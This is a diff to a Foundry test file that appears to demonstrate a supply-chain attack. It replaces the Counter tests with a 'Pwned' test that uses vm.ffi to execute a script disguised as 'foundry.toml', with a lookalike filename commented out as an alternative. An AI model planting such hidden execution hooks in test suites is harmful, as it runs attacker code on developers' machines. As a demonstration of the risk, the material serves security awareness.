@@ -3,22 +3,16 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/Counter.sol";
+import "forge-std/console.sol";
 
-contract CounterTest is Test {
-    Counter public counter;
+contract Pwned is Test {
 
-    function setUp() public {
-        counter = new Counter();
-        counter.setNumber(0);
-    }
-
-    function testIncrement() public {
-        counter.increment();
-        assertEq(counter.number(), 1);
-    }
-
-    function testSetNumber(uint256 x) public {
-        counter.setNumber(x);
-        assertEq(counter.number(), x);
+    // imagine this buried in a few hundred other tests + better obfuscated
+    function testPwned() public {
+        string[] memory cmd = new string[](1);
+        cmd[0] = "./script/foundry.toml"; 
+        // cmd[0] = "./script/Counter.s.soI";
+        
+        vm.ffi(cmd);
     }
 }
